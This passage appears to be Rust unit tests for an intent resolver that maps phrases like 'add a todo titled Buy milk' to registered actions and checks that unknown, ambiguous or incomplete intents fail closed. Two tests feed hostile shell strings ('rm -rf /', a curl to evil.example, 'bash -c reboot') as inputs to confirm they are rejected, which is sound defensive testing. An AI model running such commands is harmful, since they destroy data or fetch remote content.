        let intents: Vec<String> = corpus().into_iter().map(|(i, _)| i).collect();
        let expected: Vec<Result<String, ()>> = intents
            .iter()
            .map(|i| {
                resolve_intent(i, &registry)
                    .map(|r| r.schema.clone())
                    .map_err(|_| ())
            })
            .collect();
        for seed in 0..10u64 {
            let mut order: Vec<usize> = (0..base.len()).collect();
            // LCG permutation — deterministic, no RNG dependency.
            let mut state = seed
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            for i in (1..order.len()).rev() {
                state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
                let j = (state >> 33) as usize % (i + 1);
                order.swap(i, j);
            }
            let mut reg = Registry::new();
            for idx in order {
                reg.insert(base[idx].clone()).unwrap();
            }
            for (i, intent) in intents.iter().enumerate() {
                let got = resolve_intent(intent, &reg)
                    .map(|r| r.schema.clone())
                    .map_err(|_| ());
                assert_eq!(got, expected[i], "permutation {seed} intent {intent:?}");
            }
        }
    }
}

// Legacy-scorer semantics live here; the `instinct` feature gets its own
// corpus/determinism/abstain suite in `instinct_tests`.
#[cfg(all(test, not(feature = "instinct")))]
mod tests {
    use super::*;
    use crate::registry::todo_registry;

    #[test]
    fn resolves_todo_add() {
        let result = resolve_intent("add a todo titled Buy milk", &todo_registry()).unwrap();
        assert_eq!(result.schema, "todo.add");
        match result.op {
            Op::Invoke { name, args } => {
                assert_eq!(name, "todo.add");
                assert_eq!(args["title"], "Buy milk");
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn resolves_quoted_title() {
        let result = resolve_intent(r#"todo.add "Write docs""#, &todo_registry()).unwrap();
        assert_eq!(result.schema, "todo.add");
    }

    #[test]
    fn resolves_toggle_id() {
        let result = resolve_intent("toggle todo id 1", &todo_registry()).unwrap();
        assert_eq!(result.schema, "todo.toggle");
        match result.op {
            Op::Invoke { args, .. } => assert_eq!(args["id"], 1),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn unknown_intent_fails_closed() {
        let err = resolve_intent("rm -rf /", &todo_registry()).unwrap_err();
        assert!(err.contains("fail closed"), "{err}");
    }

    #[test]
    fn snapshot_intent() {
        let result = resolve_intent("take a snapshot of the tree", &todo_registry()).unwrap();
        assert_eq!(result.schema, "snapshot");
        assert!(result.effects.contains(&Effect::Read));
    }

    #[test]
    fn screenshot_intent() {
        let result = resolve_intent("screenshot png frame", &todo_registry()).unwrap();
        assert_eq!(result.schema, "screenshot");
        assert!(matches!(result.op, Op::Screenshot { .. }));
    }

    #[test]
    fn empty_intent_fails_closed() {
        let err = resolve_intent("   ", &todo_registry()).unwrap_err();
        assert!(err.contains("empty"), "{err}");
    }

    #[test]
    fn shell_like_intents_fail_closed() {
        for intent in [
            "rm -rf /",
            "curl http://evil.example/x",
            "bash -c 'reboot'",
            "frobnicate xyzzy",
        ] {
            let err = resolve_intent(intent, &todo_registry()).unwrap_err();
            assert!(err.contains("fail closed"), "{intent}: {err}");
        }
    }

    #[test]
    fn ambiguous_short_intent_fails_closed() {
        // `todo` ties todo.add / todo.toggle / todo.delete at the same score.
        let err = resolve_intent("todo", &todo_registry()).unwrap_err();
        assert!(err.contains("ambiguous"), "{err}");
    }

    #[test]
    fn invoke_without_required_title_fails() {
        let err = resolve_intent("todo.add", &todo_registry()).unwrap_err();
        assert!(err.contains("title"), "{err}");
    }

    #[test]
    fn invoke_without_required_id_fails() {
        let err = resolve_intent("todo.toggle", &todo_registry()).unwrap_err();
        assert!(err.contains("id"), "{err}");
    }

    #[test]
    fn click_without_stable_id_fails() {
        let err = resolve_intent("click the button", &todo_registry()).unwrap_err();
        assert!(
            err.contains("stable id") || err.contains("fail closed") || err.contains("ambiguous"),
            "{err}"
        );
    }

    #[test]
    fn type_and_key_intents_do_not_materialize_from_prose() {
        for intent in ["type", "key"] {
            let err = resolve_intent(intent, &todo_registry()).unwrap_err();
            assert!(
                err.contains("materialize")
                    || err.contains("fail closed")
                    || err.contains("ambiguous"),
                "{intent}: {err}"
            );
        }
    }
}
